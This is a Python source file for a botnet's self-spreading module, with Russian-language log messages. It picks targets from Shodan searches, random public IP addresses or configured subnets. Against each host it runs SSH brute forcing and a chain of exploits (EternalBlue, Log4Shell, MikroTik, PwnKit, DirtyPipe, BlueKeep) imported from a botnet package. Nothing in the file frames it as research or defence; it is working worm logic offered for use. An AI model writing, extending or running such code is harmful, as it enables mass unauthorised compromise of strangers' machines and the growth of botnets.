import asyncio, threading, time, json, os, random, ipaddress, socket, struct, sqlite3
from botnet.spreader import ssh_bruteforce, exploit_eternalblue, exploit_log4shell, exploit_mikrotik, exploit_pwnkit, exploit_dirtypipe, exploit_bluekeep, init_db
from utils.logger import log
import shodan

class AutoSpreader:
    def __init__(self, settings_file="avz_settings.json"):
        self.running = False
        self.thread = None
        self.load_settings(settings_file)
        self.shodan_api = None
        try:
            self.shodan_api = shodan.Shodan(self.settings.get('shodan_api_key', ''))
        except: pass

    def load_settings(self, path):
        try:
            with open(path, "r") as f:
                s = json.load(f)
            self.enabled = s.get("auto_spread_enabled", True)
            self.interval = s.get("auto_spread_interval_min", 5) * 60
            self.ranges = s.get("auto_spread_ranges", [])
            self.random_global = s.get("auto_spread_random_global", True)
            self.shodan_query = s.get("shodan_search_query", "port:22,80,443,8080")
            self.use_shodan = s.get("use_shodan", False)
        except:
            self.enabled = True
            self.interval = 300
            self.ranges = []
            self.random_global = True
            self.shodan_query = "port:22,80,443,8080"
            self.use_shodan = False

    def start(self):
        if self.running: return
        self.running = True
        self.thread = threading.Thread(target=self._worker, daemon=True)
        self.thread.start()
        log("[AutoSpreader] Глобальный автозахват запущен")

    def stop(self):
        self.running = False

    def _shodan_scan(self):
        if not self.shodan_api: return []
        try:
            results = self.shodan_api.search(self.shodan_query)
            ips = [match['ip_str'] for match in results['matches']]
            return ips
        except Exception as e:
            log(f"[AutoSpreader] Shodan error: {e}")
        return []

    def generate_random_ip(self):
        while True:
            ip_int = random.randint(0, 2**32 - 1)
            ip = socket.inet_ntoa(struct.pack('>I', ip_int))
            if ipaddress.ip_address(ip).is_private: continue
            if ip.startswith("127.") or ip.startswith("224.") or ip.startswith("225."): continue
            return ip

    def _worker(self):
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        while self.running:
            target_ips = []
            if self.use_shodan:
                target_ips = self._shodan_scan()
            if not target_ips:
                if self.random_global:
                    target_ips = [self.generate_random_ip()]
                elif self.ranges:
                    subnet = random.choice(self.ranges)
                    parts = subnet.split('/')
                    octets = parts[0].split('.')
                    mask = int(parts[1])
                    if mask == 8: ip = f"{octets[0]}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
                    elif mask == 16: ip = f"{octets[0]}.{octets[1]}.{random.randint(0,255)}.{random.randint(0,255)}"
                    elif mask == 24: ip = f"{octets[0]}.{octets[1]}.{octets[2]}.{random.randint(0,255)}"
                    else: ip = self.generate_random_ip()
                    target_ips = [ip]
                else:
                    target_ips = [self.generate_random_ip()]
            for target_ip in target_ips:
                log(f"[AutoSpreader] Атакую {target_ip}")
                try: loop.run_until_complete(ssh_bruteforce(target_ip))
                except: pass
                try: exploit_eternalblue(target_ip)
                except: pass
                try: exploit_mikrotik(target_ip)
                except: pass
                try: exploit_log4shell(f"http://{target_ip}")
                except: pass
                try: exploit_pwnkit(target_ip)
                except: pass
                try: exploit_dirtypipe(target_ip)
                except: pass
                try: exploit_bluekeep(target_ip)
                except: pass
            time.sleep(self.interval)
